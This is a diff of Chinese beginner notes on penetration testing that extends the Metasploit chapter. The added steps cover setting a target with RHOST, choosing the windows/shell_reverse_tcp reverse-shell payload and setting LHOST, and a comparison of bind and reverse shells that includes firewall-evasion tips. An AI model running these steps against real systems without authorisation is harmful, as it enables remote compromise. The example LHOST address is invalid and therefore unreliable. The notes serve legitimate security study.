@@ -1,7 +1,7 @@
 
 # 《渗透测试完全初学者指南》
 
-## 第零章 渗透测试导论
+## <font color = #1E90FF>第零章 渗透测试导论</font>
 
 - 1.明确需求阶段
         和客户面对面沟通，确保双方对渗透项目理解一致。
@@ -45,7 +45,7 @@
         结论
 
 
-## 第一章 搭建虚拟渗透实验室
+## <font color = #1E90FF>第一章 搭建虚拟渗透实验室</font>
     
 ### 1.安装VMWare
     太傻逼，懒得记。。。
@@ -83,7 +83,7 @@
 - Kali中安装步骤:
         ...
 
-## 第二章 使用kali Linux
+## <font color = #1E90FF>第二章 使用kali Linux</font>
 ### Linux命令行
         ls      #查看当前目录下文件
         ls -a   #查看当前目录下文件(包括隐藏文件，隐藏目录的前缀 . )
@@ -180,7 +180,7 @@ ifconfig
 ### Netcat——————TCP/IP连接的瑞士军刀
         查看kali栏目
 
-## 第四章 Metasploit框架
+## <font color = #1E90FF>第四章 Metasploit框架 </font>
 - 启动Metasploit
         msfconsole
 - Metasploit的帮助信息
@@ -198,7 +198,7 @@ ifconfig
     <img src="picture/msf/msf2.png" alt="Screenshot of coverpage" title="Cover page">
 
 </figure>
-- <font color = #FF4500>1.2模块验证</font><BR>
+- <font color = #FF4500>1.2模块验证,查看模块详细信息</font><BR>
 - <font color = #FF4500>可以看到①这里有具体的位置</font><BR>
 
         info <模块名称>
@@ -220,15 +220,81 @@ ifconfig
   - ⑧：有效载荷-用于帮助Metasploit选取有效载荷
   - ⑨：模块介绍：介绍相应的漏洞的详细介绍
   - ⑩：是在线漏洞数据库的网络连接<BR>
- <font color = #FF0000>1.选定了合适的模块之后，首先指定Metasploit的攻击模块</font><BR>
+ <font color = #FF0000>1.选定了合适的模块之后，首先指定Metasploit的攻击模块(选择使用哪个)</font><BR>
  
 </figure>
      <figure class="thumbnails">
         <img src="picture/msf/5.png" alt="Screenshot of coverpage" title="Cover page">
 </figure>
 
+### 2.设置模块选项
+-  <font color = #FF0000>选定了模块之后，还需要对模块进行进一步的设置</font><BR>
+        show options
 
+</figure>
+     <figure class="thumbnails">
+        <img src="picture/msf/7.png" alt="Screenshot of coverpage" title="Cover page">
+</figure>
 
+- <font color = #FF0000>1.返回的清单从左到右依次是，选项名称，选项的默认值，是否是必填项，描述</font><BR>
+- ①：用于设定exploit的目标主机---（作用：告诉msf攻击哪台主机）  
+        格式： set <待设选项的名称> <选项值>
+        例： set RHOST 192.168.2.134
+- ②：用于设定攻击对象的具体端口
+- ③：默认值就行了。。。。
+- ④：Exploit Target的id ：用于设定目标主机的操作系统及具体版本号
+        也可以使用 show targets 查看具体信息
+
+### 3.有效载荷
+<font color = #FF0000>到这一步，说明准备工作已经完成的差不多了，下面开始选择有效载荷</font><BR>
+- <font color = #FF0000>3.1查找兼容的有效载荷</font><BR>
+        show payloads
+- <font color = #FF0000> 注：即使我们忘记了设置有效载荷的某些选项，Metasploit也会给exploit模块分配默认的有效载荷和相关的默认设置</font><BR>
+       
+
+</figure>
+     <figure class="thumbnails">
+        <img src="picture/msf/8.png" alt="Screenshot of coverpage" title="Cover page">
+</figure>
+
+### 3.试运行    
+        run 或者 exploit 
+        exit    #退出
+### 4.Shell的种类 
+- <font color = #FF0000>1.绑定型</font><BR>
+就是令计算机启动命令行接口的后台程序，并且在本地监听网络端口的shell在使用这种shell时候，攻击角色的主机连接到目标主机的监听端口上发送遥控命令<BR>
+<font color = #FF0000></font><BR>
+<table><tr><td bgcolor=PowderBlue>注：如果目标主机部署了防火墙，绑定型shell的效果会大打折扣</td></tr></table>
+
+- <font color = #FF0000>1.反射型</font><BR>
+反射型shell会指定发起连接，自动连入攻击主机，在使用反射型shell时，首先在攻击主机是打开一个端口，以应答目标主机发起的回话连接
+<table><tr><td bgcolor=PowderBlue>注：在穿透防火墙方面，反射型比绑定型成功率高</td></tr></table>
+
+### 5.手动设置有效载荷
+在上一步中通过show payloads查找有效载荷，下面手动设置选定的载荷
+
+```
+        语法： set payload <选定的载荷名称> 
+        例： set payload windows/shell_reverse_tcp
+```
+
+</figure>
+     <figure class="thumbnails">
+        <img src="picture/msf/9.png" alt="Screenshot of coverpage" title="Cover page">
+</figure>
+
+- ①：设置选定的载荷
+- ②：查看详细详细
+- ③： 运行kali系统的主机IP
+        set LHOST 12.168.2.307
+ ### 6.运行     
+        run 或者 exploit 
+        exit    #退出
+ ### 7.其他
+
+- ①：关闭shell的命令————Ctrl+C
+	
+## <font color = #1E90FF>第五章 信息收集</font>
 
 
 
